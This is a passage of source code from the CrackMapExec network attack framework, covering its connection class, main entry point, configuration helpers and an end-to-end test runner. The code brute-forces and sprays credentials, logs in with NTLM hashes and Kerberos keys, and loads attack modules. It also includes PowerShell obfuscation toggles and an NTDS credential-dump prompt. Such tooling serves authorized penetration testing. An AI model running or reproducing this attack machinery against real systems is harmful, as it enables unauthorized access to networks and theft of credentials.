AI_CANONNAME):\n            af, socktype, proto, canonname, sa = res\n        host = canonname if ip_address(sa[0]).is_link_local else sa[0]\n    except socket.gaierror:\n        for res in getaddrinfo( hostname, None, AF_INET, SOCK_DGRAM, IPPROTO_IP, AI_CANONNAME):\n            af, socktype, proto, canonname, sa = res\n        host = sa[0] if sa[0] else canonname\n    return host\n\ndef requires_admin(func):\n    def _decorator(self, *args, **kwargs):\n        if self.admin_privs is False:\n            return\n        return func(self, *args, **kwargs)\n\n    return wraps(func)(_decorator)\n\ndef dcom_FirewallChecker(iInterface, timeout):\n    stringBindings = iInterface.get_cinstance().get_string_bindings()\n    for strBinding in stringBindings:\n        if strBinding[\'wTowerId\'] == 7:\n            if strBinding[\'aNetworkAddr\'].find(\'[\') >= 0:\n                binding, _, bindingPort = strBinding[\'aNetworkAddr\'].partition(\'[\')\n                bindingPort = \'[\' + bindingPort\n            else:\n                binding = strBinding[\'aNetworkAddr\']\n                bindingPort = \'\'\n\n            if binding.upper().find(iInterface.get_target().upper()) >= 0:\n                stringBinding = \'ncacn_ip_tcp:\' + strBinding[\'aNetworkAddr\'][:-1]\n                break\n            elif iInterface.is_fqdn() and binding.upper().find(iInterface.get_target().upper().partition(\'.\')[0]) >= 0:\n                stringBinding = \'ncacn_ip_tcp:%s%s\' % (iInterface.get_target(), bindingPort)\n    if ""stringBinding"" not in locals():\n        return True, None\n    try:\n        rpctransport = transport.DCERPCTransportFactory(stringBinding)\n        rpctransport.set_connect_timeout(timeout)\n        rpctransport.connect()\n        rpctransport.disconnect()\n    except:\n        return False, stringBinding\n    else:\n        return True, stringBinding\n\nclass connection(object):\n    def __init__(self, args, db, host):\n        self.domain = None\n        self.args = args\n        self.db = db\n        self.hostname = host\n        self.conn = None\n        self.admin_privs = False\n        self.password = """"\n        self.username = """"\n        self.kerberos = True if self.args.kerberos or self.args.use_kcache or self.args.aesKey else False\n        self.aesKey = None if not self.args.aesKey else self.args.aesKey[0]\n        self.kdcHost = None if not self.args.kdcHost else self.args.kdcHost\n        self.use_kcache = None if not self.args.use_kcache else self.args.use_kcache\n        self.failed_logins = 0\n        self.local_ip = None\n        self.logger = cme_logger\n\n        try:\n            self.host = gethost_addrinfo(self.hostname)\n            if self.args.kerberos:\n                self.host = self.hostname\n            self.logger.info(f""Socket info: host={self.host}, hostname={self.hostname}, kerberos={ \'True\' if self.args.kerberos else \'False\' }"")\n        except Exception as e:\n            self.logger.info(f""Error resolving hostname {self.hostname}: {e}"")\n            return\n\n        if args.jitter:\n            jitter = args.jitter\n            if ""-"" in jitter:\n                start, end = jitter.split(""-"")\n                jitter = (int(start), int(end))\n            else:\n                jitter = (0, int(jitter))\n\n            value = random.choice(range(jitter[0], jitter[1]))\n            self.logger.debug(f""Doin\' the jitterbug for {value} second(s)"")\n            sleep(value)\n\n        try:\n            self.proto_flow()\n        except Exception as e:\n            self.logger.exception(f""Exception while calling proto_flow() on target {self.host}: {e}"")\n\n    @staticmethod\n    def proto_args(std_parser, module_parser):\n        return\n\n    def proto_logger(self):\n        pass\n\n    def enum_host_info(self):\n        return\n\n    def print_host_info(self):\n        return\n\n    def create_conn_obj(self):\n        return\n\n    def check_if_admin(self):\n        return\n\n    def kerberos_login(\n        self,\n        domain,\n        username,\n        password="""",\n        ntlm_hash="""",\n        aesKey="""",\n        kdcHost="""",\n        useCache=False,\n    ):\n        return\n\n    def plaintext_login(self, domain, username, password):\n        return\n\n    def hash_login(self, domain, username, ntlm_hash):\n        return\n\n    def proto_flow(self):\n        self.logger.debug(f""Kicking off proto_flow"")\n        self.proto_logger()\n        if self.create_conn_obj():\n            self.enum_host_info()\n            if self.print_host_info():\n                # because of null session\n                if self.login() or (self.username == """" and self.password == """"):\n                    if hasattr(self.args, ""module"") and self.args.module:\n                        self.call_modules()\n                    else:\n                        self.call_cmd_args()\n\n    def call_cmd_args(self):\n        for k, v in vars(self.args).items():\n            if hasattr(self, k) and hasattr(getattr(self, k), ""__call__""):\n                if v is not False and v is not None:\n                    self.logger.debug(f""Calling {k}()"")\n                    r = getattr(self, k)()\n\n    def call_modules(self):\n        for module in self.module:\n            self.logger.debug(f""Loading module {module.name} - {module}"")\n            module_logger = CMEAdapter(\n                extra={\n                    ""module_name"": module.name.upper(),\n                    ""host"": self.host,\n                    ""port"": self.args.port,\n                    ""hostname"": self.hostname,\n                },\n            )\n\n            self.logger.debug(f""Loading context for module {module.name} - {module}"")\n            context = Context(self.db, module_logger, self.args)\n            context.localip = self.local_ip\n\n            if hasattr(module, ""on_request"") or hasattr(module, ""has_response""):\n                self.logger.debug(f""Module {module.name} has on_request or has_response methods"")\n                self.server.connection = self\n                self.server.context.localip = self.local_ip\n\n            if hasattr(module, ""on_login""):\n                self.logger.debug(f""Module {module.name} has on_login method"")\n                module.on_login(context, self)\n\n            if self.admin_privs and hasattr(module, ""on_admin_login""):\n                self.logger.debug(f""Module {module.name} has on_admin_login method"")\n                module.on_admin_login(context, self)\n\n            if (not hasattr(module, ""on_request"") and not hasattr(module, ""has_response"")) and hasattr(module, ""on_shutdown""):\n                self.logger.debug(f""Module {module.name} has on_shutdown method"")\n                module.on_shutdown(context, self)\n\n    def inc_failed_login(self, username):\n        global global_failed_logins\n        global user_failed_logins\n\n        if username not in user_failed_logins.keys():\n            user_failed_logins[username] = 0\n\n        user_failed_logins[username] += 1\n        global_failed_logins += 1\n        self.failed_logins += 1\n\n    def over_fail_limit(self, username):\n        global global_failed_logins\n        global user_failed_logins\n\n        if global_failed_logins == self.args.gfail_limit:\n            return True\n\n        if self.failed_logins == self.args.fail_limit:\n            return True\n\n        if username in user_failed_logins.keys():\n            if self.args.ufail_limit == user_failed_logins[username]:\n                return True\n\n        return False\n\n    def query_db_creds(self):\n        """"""\n        Queries the database for credentials to be used for authentication.\n        Valid cred_id values are:\n            - a single cred_id\n            - a range specified with a dash (ex. 1-5)\n            - \'all\' to select all credentials\n\n        :return: domain[], username[], owned[], secret[], cred_type[]\n        """"""\n        domain = []\n        username = []\n        owned = []\n        secret = []\n        cred_type = []\n        creds = []  # list of tuples (cred_id, domain, username, secret, cred_type, pillaged_from) coming from the database\n        data = []  # Arbitrary data needed for the login, e.g. ssh_key\n\n        for cred_id in self.args.cred_id:\n            if isinstance(cred_id, str) and cred_id.lower() == \'all\':\n                creds = self.db.get_credentials()\n            else:\n                if not self.db.get_credentials(filter_term=int(cred_id)):\n                    self.logger.error(\'Invalid database credential ID {}!\'.format(cred_id))\n                    continue\n                creds.extend(self.db.get_credentials(filter_term=int(cred_id)))\n\n        for cred in creds:\n            c_id, domain_single, username_single, secret_single, cred_type_single, pillaged_from = cred\n            domain.append(domain_single)\n            username.append(username_single)\n            owned.append(False)  # As these are likely valid we still want to test them if they are specified in the command line\n            secret.append(secret_single)\n            cred_type.append(cred_type_single)\n\n        if len(secret) != len(data): data = [None] * len(secret)\n        return domain, username, owned, secret, cred_type, data\n\n    def parse_credentials(self):\n        """"""\n        Parse credentials from the command line or from a file specified.\n        Usernames can be specified with a domain (domain\\\\username) or without (username).\n        If the file contains domain\\\\username the domain specified will be overwritten by the one in the file.\n\n        :return: domain[], username[], owned[], secret[], cred_type[]\n        """"""\n        domain = []\n        username = []\n        owned = []\n        secret = []\n        cred_type = []\n\n        # Parse usernames\n        for user in self.args.username:\n            if isfile(user):\n                with open(user, \'r\') as user_file:\n                    for line in user_file:\n                        if ""\\\\"" in line:\n                            domain_single, username_single = line.split(""\\\\"")\n                        else:\n                            domain_single = self.args.domain if hasattr(self.args, ""domain"") and self.args.domain else self.domain\n                            username_single = line\n                        domain.append(domain_single)\n                        username.append(username_single.strip())\n                        owned.append(False)\n            else:\n                if ""\\\\"" in user:\n                    domain_single, username_single = user.split(""\\\\"")\n                else:\n                    domain_single = self.args.domain if hasattr(self.args, ""domain"") and self.args.domain else self.domain\n                    username_single = user\n                domain.append(domain_single)\n                username.append(username_single)\n                owned.append(False)\n\n        # Parse passwords\n        for password in self.args.password:\n            if isfile(password):\n                with open(password, \'r\') as password_file:\n                    for line in password_file:\n                        secret.append(line.strip())\n                        cred_type.append(\'plaintext\')\n            else:\n                secret.append(password)\n                cred_type.append(\'plaintext\')\n\n        # Parse NTLM-hashes\n        if hasattr(self.args, ""hash"") and self.args.hash:\n            for ntlm_hash in self.args.hash:\n                if isfile(ntlm_hash):\n                    with open(ntlm_hash, \'r\') as ntlm_hash_file:\n                        for line in ntlm_hash_file:\n                            secret.append(line.strip())\n                            cred_type.append(\'hash\')\n                else:\n                    secret.append(ntlm_hash)\n                    cred_type.append(\'hash\')\n\n        # Parse AES keys\n        if self.args.aesKey:\n            for aesKey in self.args.aesKey:\n                if isfile(aesKey):\n                    with open(aesKey, \'r\') as aesKey_file:\n                        for line in aesKey_file:\n                            secret.append(line.strip())\n                            cred_type.append(\'aesKey\')\n                else:\n                    secret.append(aesKey)\n                    cred_type.append(\'aesKey\')\n\n        return domain, username, owned, secret, cred_type, [None] * len(secret)\n\n    def try_credentials(self, domain, username, owned, secret, cred_type, data=None):\n        """"""\n        Try to login using the specified credentials and protocol.\n        Possible login methods are:\n            - plaintext (/kerberos)\n            - NTLM-hash (/kerberos)\n            - AES-key\n        """"""\n        if self.over_fail_limit(username):\n            return False\n        if self.args.continue_on_success and owned:\n            return False\n        # Enforcing FQDN for SMB if not using local authentication. Related issues/PRs: #26, #28, #24, #38\n        if self.args.protocol == \'smb\' and not self.args.local_auth and ""."" not in domain and not self.args.laps and secret != """" and not (self.domain.upper() == self.hostname.upper()) :\n            self.logger.error(f""Domain {domain} for user {username.rstrip()} need to be FQDN ex:domain.local, not domain"")\n            return False\n\n        with sem:\n            if cred_type == \'plaintext\':\n                if self.args.kerberos:\n                    return self.kerberos_login(domain, username, secret, \'\', \'\', self.kdcHost, False)\n                elif hasattr(self.args, ""domain""):  # Some protocolls don\'t use domain for login\n                    return self.plaintext_login(domain, username, secret)\n                elif self.args.protocol == \'ssh\':\n                    return self.plaintext_login(username, secret, data)\n                else:\n                    return self.plaintext_login(username, secret)\n            elif cred_type == \'hash\':\n                if self.args.kerberos:\n                    return self.kerberos_login(domain, username, \'\', secret, \'\', self.kdcHost, False)\n                return self.hash_login(domain, username, secret)\n            elif cred_type == \'aesKey\':\n                return self.kerberos_login(domain, username, \'\', \'\', secret, self.kdcHost, False)\n\n    def login(self):\n        """"""\n        Try to login using the credentials specified in the command line or in the database.\n\n        :return: True if the login was successful and ""--continue-on-success"" was not specified, False otherwise.\n        """"""\n        # domain[n] always corresponds to username[n] and owned [n]\n        domain = []\n        username = []\n        owned = []  # Determines whether we have found a valid credential for this user. Default: False\n        # secret[n] always corresponds to cred_type[n]\n        secret = []\n        cred_type = []\n        data = []  # Arbitrary data needed for the login, e.g. ssh_key\n\n        if self.args.cred_id:\n            db_domain, db_username, db_owned, db_secret, db_cred_type, db_data = self.query_db_creds()\n            domain.extend(db_domain)\n            username.extend(db_username)\n            owned.extend(db_owned)\n            secret.extend(db_secret)\n            cred_type.extend(db_cred_type)\n            data.extend(db_data)\n\n        if self.args.username:\n            parsed_domain, parsed_username, parsed_owned, parsed_secret, parsed_cred_type, parsed_data = self.parse_credentials()\n            domain.extend(parsed_domain)\n            username.extend(parsed_username)\n            owned.extend(parsed_owned)\n            secret.extend(parsed_secret)\n            cred_type.extend(parsed_cred_type)\n            data.extend(parsed_data)\n\n        if self.args.use_kcache:\n            with sem:\n                username = self.args.username[0] if len(self.args.username) else """"\n                password = self.args.password[0] if len(self.args.password) else """"\n                self.kerberos_login(self.domain, username, password, """", """", self.kdcHost, True)\n                self.logger.info(""Successfully authenticated using Kerberos cache"")\n                return True\n\n        if not self.args.no_bruteforce:\n            for secr_index, secr in enumerate(secret):\n                for user_index, user in enumerate(username):\n                    if self.try_credentials(domain[user_index], user, owned[user_index], secr, cred_type[secr_index], data[secr_index]):\n                        owned[user_index] = True\n                        if not self.args.continue_on_success:\n                            return True\n        else:\n            if len(username) != len(secret):\n                self.logger.error(""Number provided of usernames and passwords/hashes do not match!"")\n                return False\n            for user_index, user in enumerate(username):\n                if self.try_credentials(domain[user_index], user, owned[user_index], secret[user_index], cred_type[user_index], data[user_index]) and not self.args.continue_on_success:\n                    owned[user_index] = True\n                    if not self.args.continue_on_success:\n                        return True\n\n    def mark_pwned(self):\n        return highlight(f""({pwned_label})"" if self.admin_privs else """")\n', 'console.py': 'from rich.console import Console\n\ncme_console = Console(soft_wrap=True, tab_size=4)\n', 'context.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport configparser\nimport os\n\n\nclass Context:\n    def __init__(self, db, logger, args):\n        for key, value in vars(args).items():\n            setattr(self, key, value)\n\n        self.db = db\n        self.log_folder_path = os.path.join(os.path.expanduser(""~/.cme""), ""logs"")\n        self.localip = None\n\n        self.conf = configparser.ConfigParser()\n        self.conf.read(os.path.expanduser(""~/.cme/cme.conf""))\n\n        self.log = logger\n        # self.log.debug = logging.debug\n', 'crackmapexec.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nfrom cme.helpers.logger import highlight\nfrom cme.helpers.misc import identify_target_file\nfrom cme.parsers.ip import parse_targets\nfrom cme.parsers.nmap import parse_nmap_xml\nfrom cme.parsers.nessus import parse_nessus_file\nfrom cme.cli import gen_cli_args\nfrom cme.loaders.protocolloader import ProtocolLoader\nfrom cme.loaders.moduleloader import ModuleLoader\nfrom cme.servers.http import CMEServer\nfrom cme.first_run import first_run_setup\nfrom cme.context import Context\nfrom cme.paths import CME_PATH, DATA_PATH\nfrom cme.console import cme_console\nfrom cme.logger import cme_logger\nfrom cme.config import cme_config, cme_workspace, config_log, ignore_opsec\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\nimport asyncio\nimport cme.helpers.powershell as powershell\nimport shutil\nimport webbrowser\nimport random\nimport os\nfrom os.path import exists\nfrom os.path import join as path_join\nfrom sys import exit\nimport logging\nimport sqlalchemy\nfrom rich.progress import Progress\nfrom sys import platform\n\n# Increase file_limit to prevent error ""Too many open files""\nif platform != ""win32"":\n    import resource\n    file_limit = list(resource.getrlimit(resource.RLIMIT_NOFILE))\n    if file_limit[1] > 10000:\n        file_limit[0] = 10000\n    else:\n        file_limit[0] = file_limit[1]\n    file_limit = tuple(file_limit)\n    resource.setrlimit(resource.RLIMIT_NOFILE, file_limit)\n\ntry:\n    import librlers\nexcept:\n    print(""Incompatible python version, try with another python version or another binary 3.8 / 3.9 / 3.10 / 3.11 that match your python version (python -V)"")\n    exit(1)\n\ndef create_db_engine(db_path):\n    db_engine = sqlalchemy.create_engine(f""sqlite:///{db_path}"", isolation_level=""AUTOCOMMIT"", future=True)\n    return db_engine\n\n\nasync def start_run(protocol_obj, args, db, targets):\n    cme_logger.debug(f""Creating ThreadPoolExecutor"")\n    if args.no_progress or len(targets) == 1:\n        with ThreadPoolExecutor(max_workers=args.threads + 1) as executor:\n            cme_logger.debug(f""Creating thread for {protocol_obj}"")\n            _ = [executor.submit(protocol_obj, args, db, target) for target in targets]\n    else:\n        with Progress(console=cme_console) as progress:\n            with ThreadPoolExecutor(max_workers=args.threads + 1) as executor:\n                current = 0\n                total = len(targets)\n                tasks = progress.add_task(\n                    f""[green]Running CME against {total} {\'target\' if total == 1 else \'targets\'}"",\n                    total=total,\n                )\n                cme_logger.debug(f""Creating thread for {protocol_obj}"")\n                futures = [executor.submit(protocol_obj, args, db, target) for target in targets]\n                for _ in as_completed(futures):\n                    current += 1\n                    progress.update(tasks, completed=current)\n\n\ndef main():\n    first_run_setup(cme_logger)\n    root_logger = logging.getLogger(""root"")\n    args = gen_cli_args()\n\n    if args.verbose:\n        cme_logger.logger.setLevel(logging.INFO)\n        root_logger.setLevel(logging.INFO)\n    elif args.debug:\n        cme_logger.logger.setLevel(logging.DEBUG)\n        root_logger.setLevel(logging.DEBUG)\n    else:\n        cme_logger.logger.setLevel(logging.ERROR)\n        root_logger.setLevel(logging.ERROR)\n\n    # if these are the same, it might double log to file (two FileHandlers will be added)\n    # but this should never happen by accident\n    if config_log:\n        cme_logger.add_file_log()\n    if hasattr(args, ""log"") and args.log:\n        cme_logger.add_file_log(args.log)\n\n    cme_logger.debug(f""Passed args: {args}"")\n\n    # FROM HERE ON A PROTOCOL IS REQUIRED\n    if not args.protocol:\n        exit(1)\n\n    if args.protocol == ""ssh"":\n        if args.key_file:\n            if not args.password:\n                cme_logger.fail(f""Password is required, even if a key file is used - if no passphrase for key, use `-p \'\'`"")\n                exit(1)\n\n    if args.use_kcache and not os.environ.get(""KRB5CCNAME""):\n        cme_logger.error(""KRB5CCNAME environment variable is not set"")\n        exit(1)\n\n    module_server = None\n    targets = []\n    server_port_dict = {""http"": 80, ""https"": 443, ""smb"": 445}\n\n    if hasattr(args, ""cred_id"") and args.cred_id:\n        for cred_id in args.cred_id:\n            if ""-"" in str(cred_id):\n                start_id, end_id = cred_id.split(""-"")\n                try:\n                    for n in range(int(start_id), int(end_id) + 1):\n                        args.cred_id.append(n)\n                    args.cred_id.remove(cred_id)\n                except Exception as e:\n                    cme_logger.error(f""Error parsing database credential id: {e}"")\n                    exit(1)\n\n    if hasattr(args, ""target"") and args.target:\n        for target in args.target:\n            if exists(target) and os.path.isfile(target):\n                target_file_type = identify_target_file(target)\n                if target_file_type == ""nmap"":\n                    targets.extend(parse_nmap_xml(target, args.protocol))\n                elif target_file_type == ""nessus"":\n                    targets.extend(parse_nessus_file(target, args.protocol))\n                else:\n                    with open(target, ""r"") as target_file:\n                        for target_entry in target_file:\n                            targets.extend(parse_targets(target_entry.strip()))\n            else:\n                targets.extend(parse_targets(target))\n\n    # The following is a quick hack for the powershell obfuscation functionality, I know this is yucky\n    if hasattr(args, ""clear_obfscripts"") and args.clear_obfscripts:\n        shutil.rmtree(os.path.expanduser(""~/.cme/obfuscated_scripts/""))\n        os.mkdir(os.path.expanduser(""~/.cme/obfuscated_scripts/""))\n        cme_logger.success(""Cleared cached obfuscated PowerShell scripts"")\n\n    if hasattr(args, ""obfs"") and args.obfs:\n        powershell.obfuscate_ps_scripts = True\n\n    cme_logger.debug(f""Protocol: {args.protocol}"")\n    p_loader = ProtocolLoader()\n    protocol_path = p_loader.get_protocols()[args.protocol][""path""]\n    cme_logger.debug(f""Protocol Path: {protocol_path}"")\n    protocol_db_path = p_loader.get_protocols()[args.protocol][""dbpath""]\n    cme_logger.debug(f""Protocol DB Path: {protocol_db_path}"")\n\n    protocol_object = getattr(p_loader.load_protocol(protocol_path), args.protocol)\n    cme_logger.debug(f""Protocol Object: {protocol_object}"")\n    protocol_db_object = getattr(p_loader.load_protocol(protocol_db_path), ""database"")\n    cme_logger.debug(f""Protocol DB Object: {protocol_db_object}"")\n\n    db_path = path_join(CME_PATH, ""workspaces"", cme_workspace, f""{args.protocol}.db"")\n    cme_logger.debug(f""DB Path: {db_path}"")\n\n    db_engine = create_db_engine(db_path)\n\n    db = protocol_db_object(db_engine)\n\n    # with the new cme/config.py this can be eventually removed, as it can be imported anywhere\n    setattr(protocol_object, ""config"", cme_config)\n\n    if args.module or args.list_modules:\n        loader = ModuleLoader(args, db, cme_logger)\n        modules = loader.list_modules()\n\n    if args.list_modules:\n        for name, props in sorted(modules.items()):\n            if args.protocol in props[""supported_protocols""]:\n                cme_logger.display(f""{name:<25} {props[\'description\']}"")\n        exit(0)\n    elif args.module and args.show_module_options:\n        for module in args.module:\n            cme_logger.display(f""{module} module options:\\n{modules[module][\'options\']}"")\n        exit(0)\n    elif args.module:\n        cme_logger.debug(f""Modules to be Loaded: {args.module}, {type(args.module)}"")\n        for m in map(str.lower, args.module):\n            if m not in modules:\n                cme_logger.error(f""Module not found: {m}"")\n                exit(1)\n\n            cme_logger.debug(f""Loading module {m} at path {modules[m][\'path\']}"")\n            module = loader.init_module(modules[m][""path""])\n\n            if not module.opsec_safe:\n                if ignore_opsec:\n                    cme_logger.debug(f""ignore_opsec is set in the configuration, skipping prompt"")\n                    cme_logger.display(f""Ignore OPSEC in configuration is set and OPSEC unsafe module loaded"")\n                else:\n                    ans = input(\n                        highlight(\n                            ""[!] Module is not opsec safe, are you sure you want to run this? [Y/n] For global configuration, change ignore_opsec value to True on ~/cme/cme.conf"",\n                            ""red"",\n                        )\n                    )\n                    if ans.lower() not in [""y"", ""yes"", """"]:\n                        exit(1)\n\n            if not module.multiple_hosts and len(targets) > 1:\n                ans = input(\n                    highlight(\n                        ""[!] Running this module on multiple hosts doesn\'t really make any sense, are you sure you want to continue? [Y/n] "",\n                        ""red"",\n                    )\n                )\n                if ans.lower() not in [""y"", ""yes"", """"]:\n                    exit(1)\n\n            if hasattr(module, ""on_request"") or hasattr(module, ""has_response""):\n                if hasattr(module, ""required_server""):\n                    args.server = module.required_server\n\n                if not args.server_port:\n                    args.server_port = server_port_dict[args.server]\n\n                # loading a module server multiple times will obviously fail\n                try:\n                    context = Context(db, cme_logger, args)\n                    module_server = CMEServer(\n                        module,\n                        context,\n                        cme_logger,\n                        args.server_host,\n                        args.server_port,\n                        args.server,\n                    )\n                    module_server.start()\n                    protocol_object.server = module_server.server\n                except Exception as e:\n                    cme_logger.error(f""Error loading module server for {module}: {e}"")\n\n            cme_logger.debug(f""proto_object: {protocol_object}, type: {type(protocol_object)}"")\n            cme_logger.debug(f""proto object dir: {dir(protocol_object)}"")\n            # get currently set modules, otherwise default to empty list\n            current_modules = getattr(protocol_object, ""module"", [])\n            current_modules.append(module)\n            setattr(protocol_object, ""module"", current_modules)\n            cme_logger.debug(f""proto object module after adding: {protocol_object.module}"")\n\n    if hasattr(args, ""ntds"") and args.ntds and not args.userntds:\n        ans = input(\n            highlight(\n                ""[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] "",\n                ""red"",\n            )\n        )\n        if ans.lower() not in [""y"", ""yes"", """"]:\n            exit(1)\n\n    try:\n        asyncio.run(start_run(protocol_object, args, db, targets))\n    except KeyboardInterrupt:\n        cme_logger.debug(""Got keyboard interrupt"")\n    finally:\n        if module_server:\n            module_server.shutdown()\n        db_engine.dispose()\n\n\nif __name__ == ""__main__"":\n    main()\n', 'first_run.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom os import mkdir\nfrom os.path import exists\nfrom os.path import join as path_join\nimport shutil\nfrom cme.paths import CME_PATH, CONFIG_PATH, TMP_PATH, DATA_PATH\nfrom cme.cmedb import initialize_db\nfrom cme.logger import cme_logger\n\n\ndef first_run_setup(logger=cme_logger):\n    if not exists(TMP_PATH):\n        mkdir(TMP_PATH)\n\n    if not exists(CME_PATH):\n        logger.display(""First time use detected"")\n        logger.display(""Creating home directory structure"")\n        mkdir(CME_PATH)\n\n    folders = (\n        ""logs"",\n        ""modules"",\n        ""protocols"",\n        ""workspaces"",\n        ""obfuscated_scripts"",\n        ""screenshots"",\n    )\n    for folder in folders:\n        if not exists(path_join(CME_PATH, folder)):\n            logger.display(f""Creating missing folder {folder}"")\n            mkdir(path_join(CME_PATH, folder))\n\n    initialize_db(logger)\n\n    if not exists(CONFIG_PATH):\n        logger.display(""Copying default configuration file"")\n        default_path = path_join(DATA_PATH, ""cme.conf"")\n        shutil.copy(default_path, CME_PATH)\n\n    # if not exists(CERT_PATH):\n    #     logger.display(\'Generating SSL certificate\')\n    #     try:\n    #         check_output([\'openssl\', \'help\'], stderr=PIPE)\n    #         if os.name != \'nt\':\n    #             os.system(\'openssl req -new -x509 -keyout {path} -out {path} -days 365 -nodes -subj ""/C=US"" > /dev/null 2>&1\'.format(path=CERT_PATH))\n    #         else:\n    #             os.system(\'openssl req -new -x509 -keyout {path} -out {path} -days 365 -nodes -subj ""/C=US""\'.format(path=CERT_PATH))\n    #     except OSError as e:\n    #         if e.errno == errno.ENOENT:\n    #             logger.error(\'OpenSSL command line utility is not installed, could not generate certificate, using default certificate\')\n    #             default_path = path_join(DATA_PATH, \'default.pem\')\n    #             shutil.copy(default_path, CERT_PATH)\n    #         else:\n    #             logger.error(\'Error while generating SSL certificate: {}\'.format(e))\n    #             sys.exit(1)\n', 'logger.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport os\nfrom termcolor import colored\n\n\ndef write_log(data, log_name):\n    logs_dir = os.path.join(os.path.expanduser(""~/.cme""), ""logs"")\n    with open(os.path.join(logs_dir, log_name), ""w"") as log_output:\n        log_output.write(data)\n\n\ndef highlight(text, color=""yellow""):\n    if color == ""yellow"":\n        return f""{colored(text, \'yellow\', attrs=[\'bold\'])}""\n    elif color == ""red"":\n        return f""{colored(text, \'red\', attrs=[\'bold\'])}""\n', 'paths.py': 'import os\nimport sys\nimport cme\n\nCME_PATH = os.path.expanduser(""~/.cme"")\nTMP_PATH = os.path.join(""/tmp"", ""cme_hosted"")\nif os.name == ""nt"":\n    TMP_PATH = os.getenv(""LOCALAPPDATA"") + ""\\\\Temp\\\\cme_hosted""\nif hasattr(sys, ""getandroidapilevel""):\n    TMP_PATH = os.path.join(""/data"", ""data"", ""com.termux"", ""files"", ""usr"", ""tmp"", ""cme_hosted"")\nWS_PATH = os.path.join(CME_PATH, ""workspaces"")\nCERT_PATH = os.path.join(CME_PATH, ""cme.pem"")\nCONFIG_PATH = os.path.join(CME_PATH, ""cme.conf"")\nWORKSPACE_DIR = os.path.join(CME_PATH, ""workspaces"")\nDATA_PATH = os.path.join(os.path.dirname(cme.__file__), ""data"")\n', 'e2e_test.py': 'import argparse\nimport os\nimport subprocess\nfrom rich.console import Console\n\n\ndef get_cli_args():\n    parser = argparse.ArgumentParser(description=f""Script for running end to end tests for CME"")\n    parser.add_argument(""-t"", ""--target"", dest=""target"", required=True)\n    parser.add_argument(""-u"", ""--user"", ""--username"", dest=""username"", required=True)\n    parser.add_argument(""-p"", ""--pass"", ""--password"", dest=""password"", required=True)\n    parser.add_argument(\n        ""-k"",\n        ""--kerberos"",\n        action=""store_true"",\n        required=False,\n        help=""Use kerberos authentication"",\n    )\n    parser.add_argument(\n        ""-v"",\n        ""--verbose"",\n        action=""store_true"",\n        required=False,\n        help=""Display full command output"",\n    )\n    parser.add_argument(\n        ""-e"",\n        ""--errors"",\n        action=""store_true"",\n        required=False,\n        help=""Display errors from commands"",\n    )\n\n    parsed_args = parser.parse_args()\n    return parsed_args\n\n\ndef generate_commands(args):\n    lines = []\n\n    if args.kerberos:\n        kerberos = ""-k""\n    else:\n        kerberos = """"\n\n    file_loc = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))\n    commands_file = os.path.join(file_loc, ""e2e_commands.txt"")\n\n    with open(commands_file) as file:\n        for line in file:\n            if line.startswith(""#""):\n                continue\n            line = line.strip()\n            line = line.replace(""TARGET_HOST"", args.target).replace(""USERNAME"", f\'""{args.username}""\').replace(""PASSWORD"", f\'""{args.password}""\').replace(""KERBEROS "", kerberos)\n            lines.append(line)\n    return lines\n\n\ndef run_e2e_tests(args):\n    console = Console()\n    tasks = generate_commands(args)\n\n    result = subprocess.Popen(\n        ""crackmapexec --version"",\n        shell=True,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.STDOUT,\n    )\n    version = result.communicate()[0].decode().strip()\n\n    with console.status(f""[bold green] :brain: Running {len(tasks)} test commands for cme v{version}..."") as status:\n        passed = 0\n        failed = 0\n\n        while tasks:\n            task = tasks.pop(0)\n            result = subprocess.Popen(\n                str(task),\n                shell=True,\n                stdin=subprocess.PIPE,\n                stdout=subprocess.PIPE,\n                stderr=subprocess.STDOUT,\n            )\n            # pass in a ""y"" for things that prompt for it (--ndts, etc)\n            text = result.communicate(input=b""y"")[0]\n            return_code = result.returncode\n\n            if return_code == 0:\n                console.log(f""{task.strip()} :heavy_check_mark:"")\n                passed += 1\n            else:\n                console.log(f""[bold red]{task.strip()} :cross_mark:[/]"")\n                failed += 1\n\n            if args.errors:\n                raw_text = text.decode(""utf-8"")\n                if ""error"" in raw_text.lower() or ""failure"" in raw_text.lower():\n                    console.log(f""[bold red] Error Detected: {raw_text}"")\n\n            if args.verbose:\n                # this prints sorta janky, but it does its job\n                console.log(f""[*] Results:\\n{text.decode(\'utf-8\')}"")\n        console.log(f""Tests [bold green] Passed: {passed} [bold red] Failed: {failed}"")\n\n\nif __name__ == ""__main__"":\n    parsed_args = get_cli_args()\n    run_e2e_tests(parsed_args)\n', 'test_smb_database.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport os\nimport pytest\nfrom sqlalchemy import create_engine\nfrom sqlalchemy.orm import sessionmaker, scoped_session\n\nfrom cme.cmedb import delete_workspace, CMEDBMenu\nfrom cme.first_run import first_run_setup\nfrom cme.loaders.protocolloader import ProtocolLoader\nfrom cme.logger import CMEAdapter\nfrom cme.paths import WS_PATH\nfrom sqlalchemy.dialects.sqlite import Insert\n\n\n@pytest.fixture(scope=""session"")\ndef db_engine():\n    db_path = os.path.join(WS_PATH, ""test/smb.db"")\n    db_engine = create_engine(f""sqlite:///{db_path}"", isolation_level=""AUTOCOMMIT"", future=True)\n    yield db_engine\n    db_engine.dispose()\n\n\n@pytest.fixture(scope=""session"")\ndef db_setup(db_engine):\n    proto = ""smb""\n    # setup_logger()\n    logger = CMEAdapter()\n    first_run_setup(logger)\n    p_loader = ProtocolLoader()\n    protocols = p_loader.get_protocols()\n    CMEDBMenu.create_workspace(""test"", p_loader, protocols)\n\n    protocol_db_path = p_loader.get_protocols()[proto][""dbpath""]\n    protocol_db_object = getattr(p_loader.load_protocol(protocol_db_path), ""database"")\n\n    database_obj = protocol_db_object(db_engine)\n    database_obj.reflect_tables()\n    yield database_obj\n    database_obj.shutdown_db()\n    delete_workspace(""test"")\n\n\n@pytest.fixture(scope=""function"")\ndef db(db_setup):\n    yield db_setup\n    